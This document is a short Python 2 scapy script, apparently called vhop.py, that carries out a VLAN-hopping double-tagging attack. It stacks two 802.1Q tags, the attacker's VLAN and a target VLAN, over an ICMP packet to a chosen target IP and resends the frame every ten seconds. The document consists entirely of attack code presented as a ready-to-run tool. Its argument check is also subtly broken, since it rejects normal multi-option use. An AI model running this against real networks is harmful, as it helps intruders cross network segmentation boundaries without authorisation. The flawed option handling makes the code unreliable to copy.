#!/usr/bin/python

import time, getopt
from scapy.all import *

def main(argv):

	iface = ''
	our_vlan = 0
	target_vlan = 0
	target_ip = ''

	try:
		opts, args = getopt.getopt(argv,"hi:v:t:n:")
	except getopt.GetoptError:
		help()
	
	for opt, arg in opts:
		if opt == "-h":
			help()
		elif opt in ("-i"):
			iface = arg.strip()
		elif opt in ("-v"):
			our_vlan = int(arg.strip())
		elif opt in ("-t"):
			target_vlan = int(arg.strip())
		elif opt in ("-n"):
			target_ip = arg.strip()

	ether = Ether()
	dot1q1 = Dot1Q(vlan=our_vlan)
	dot1q2 = Dot1Q(vlan=target_vlan)
	ip = IP(dst=target_ip)
	icmp = ICMP()

	packet = ether/dot1q1/dot1q2/ip/icmp

	print "[*] Interface => ", iface
	print "[*] Current VLAN => ", our_vlan
	print "[*] Target VLAN => ", target_vlan
	print "[*] Target IP => ", target_ip
	
	try:
		while True:
			sendp(packet, iface=iface)
			time.sleep(10)

	except KeyboardInterrupt:
		print("Exiting.. ")
		sys.exit(0)

def help():
	print "[*] Usage: vhop.py -i <interface> -v <current vlan> -t <target vlan> -n <target ip>"
	sys.exit()

if len(sys.argv) != 2:
	print "[!] Missing options"
	help()
elif __name__ == "__main__":
	main(sys.argv[1:])
